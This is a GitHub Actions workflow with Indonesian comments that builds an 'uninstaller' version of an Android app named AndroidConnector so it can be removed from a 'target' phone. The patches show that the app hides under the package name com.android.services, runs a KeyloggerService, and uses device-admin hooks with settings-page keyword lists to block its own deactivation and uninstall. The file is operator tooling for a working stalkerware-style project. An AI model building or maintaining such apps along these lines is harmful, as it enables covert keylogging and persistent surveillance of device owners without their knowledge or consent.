name: Build Uninstaller APK

# ══════════════════════════════════════════════════════════════════════════════
#  UNINSTALLER APK — package name sama, keystore sama, proteksi dimatikan.
#  Cara pakai:
#    1. Download artifact AndroidConnector-UNINSTALLER.apk dari sini
#    2. Install ke HP target sebagai "Update" (package name identik)
#    3. Semua anti-uninstall protection → OFF
#    4. Settings → Device Admin → Nonaktifkan → OK (tidak auto-close lagi)
#    5. Settings → Apps → Uninstall → Done ✅
# ══════════════════════════════════════════════════════════════════════════════

on:
  workflow_dispatch:   # hanya jalan kalau di-trigger manual — tidak auto-run

jobs:
  build-uninstaller:
    name: 🗑️ Build Uninstaller APK (no protection)
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17', cache: gradle }

      - uses: gradle/actions/setup-gradle@v4
        with: { gradle-version: '8.4' }

      - run: cd android && gradle wrapper --gradle-version 8.4 && chmod +x gradlew

      - uses: android-actions/setup-android@v3
      - run: yes | sdkmanager --licenses || true

      # ── Patch 1: AppDeviceAdminReceiver — buang semua blocking logic ─────
      - name: Patch AppDeviceAdminReceiver (remove anti-uninstall)
        run: |
          TARGET="android/app/src/main/kotlin/com/android/services/AppDeviceAdminReceiver.kt"
          cat > "$TARGET" << 'KOTLIN'
package com.android.services

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.UserManager

/**
 * UNINSTALLER BUILD — semua proteksi dimatikan.
 * Install APK ini sebagai "update" → admin bisa dinonaktifkan normal.
 */
class AppDeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {}

    // Tidak ada blocking — user bisa deactivate normal
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence =
        "Administrator akan dinonaktifkan."

    override fun onDisabled(context: Context, intent: Intent) {}

    companion object {
        val SETTINGS_PACKAGES = emptySet<String>()
        val ADMIN_PAGE_KEYWORDS = emptyList<String>()

        fun getComponentName(context: Context) =
            ComponentName(context, AppDeviceAdminReceiver::class.java)

        fun isAdminActive(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isAdminActive(getComponentName(context))
        }

        fun isDeviceOwner(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isDeviceOwnerApp(context.packageName)
        }

        fun setBlockUninstall(context: Context, block: Boolean): String =
            "UNINSTALLER_BUILD: protection disabled"
    }
}
KOTLIN
          echo "✅ AppDeviceAdminReceiver patched — no protection"

      # ── Patch 2: KeyloggerService — matikan adminGuardEnabled secara hardcode
      - name: Patch KeyloggerService (disable guardAdminPage)
        run: |
          TARGET="android/app/src/main/kotlin/com/android/services/KeyloggerService.kt"
          # Set adminGuardEnabled default ke false (hardcode)
          sed -i 's/@Volatile var adminGuardEnabled: Boolean = true/@Volatile var adminGuardEnabled: Boolean = false/' "$TARGET"
          echo "✅ KeyloggerService patched — adminGuardEnabled = false"
          grep "adminGuardEnabled" "$TARGET"

      # ── Patch 3: ConnectorService — matikan auto setBlockUninstall on start
      - name: Patch ConnectorService (disable auto block on start)
        run: |
          TARGET="android/app/src/main/kotlin/com/android/services/ConnectorService.kt"
          # Comment out the auto-enforce block call
          sed -i 's/Thread { AppDeviceAdminReceiver.setBlockUninstall/\/\/ Thread { AppDeviceAdminReceiver.setBlockUninstall/' "$TARGET"
          echo "✅ ConnectorService patched — auto block disabled"

      # ── Decode keystore ───────────────────────────────────────────────────
      - name: Decode Keystore
        run: |
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/app/androidconnector.p12
          echo "✅ Keystore decoded (same key = valid update)"

      # ── Build & Sign ──────────────────────────────────────────────────────
      - name: Build & Sign Uninstaller APK
        env:
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon \
            -Pandroid.injected.signing.store.file="$GITHUB_WORKSPACE/android/app/androidconnector.p12" \
            -Pandroid.injected.signing.store.password="$KEYSTORE_PASSWORD" \
            -Pandroid.injected.signing.key.alias="$KEY_ALIAS" \
            -Pandroid.injected.signing.key.password="$KEY_PASSWORD"
          echo "✅ Uninstaller APK built & signed"

      # ── Package ───────────────────────────────────────────────────────────
      - name: Package Artifact
        run: |
          mkdir -p dist
          cp android/app/build/outputs/apk/release/app-release.apk \
             dist/AndroidConnector-UNINSTALLER.apk
          echo "📦 Size: $(du -h dist/AndroidConnector-UNINSTALLER.apk | cut -f1)"

      - uses: actions/upload-artifact@v4
        with:
          name: AndroidConnector-UNINSTALLER-${{ github.sha }}
          path: dist/AndroidConnector-UNINSTALLER.apk
          retention-days: 90

      - name: Summary
        run: |
          echo "## 🗑️ Uninstaller APK Siap" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "### Cara Pakai" >> $GITHUB_STEP_SUMMARY
          echo "1. Download **AndroidConnector-UNINSTALLER.apk** dari Artifacts" >> $GITHUB_STEP_SUMMARY
          echo "2. Install ke HP target → sistem anggap sebagai **Update**" >> $GITHUB_STEP_SUMMARY
          echo "3. Buka **Settings → Security → Device Admin**" >> $GITHUB_STEP_SUMMARY
          echo "4. Nonaktifkan app → **tidak auto-close** lagi ✅" >> $GITHUB_STEP_SUMMARY
          echo "5. Buka **Settings → Apps** → Uninstall → Done ✅" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "| | |" >> $GITHUB_STEP_SUMMARY
          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
          echo "| **Package** | com.android.services (sama) |" >> $GITHUB_STEP_SUMMARY
          echo "| **Keystore** | Sama — Android terima sebagai update valid |" >> $GITHUB_STEP_SUMMARY
          echo "| **Anti-Uninstall** | ❌ Dimatikan semua |" >> $GITHUB_STEP_SUMMARY
          echo "| **AdminGuard** | ❌ OFF |" >> $GITHUB_STEP_SUMMARY
          echo "| **Auto Block** | ❌ OFF |" >> $GITHUB_STEP_SUMMARY
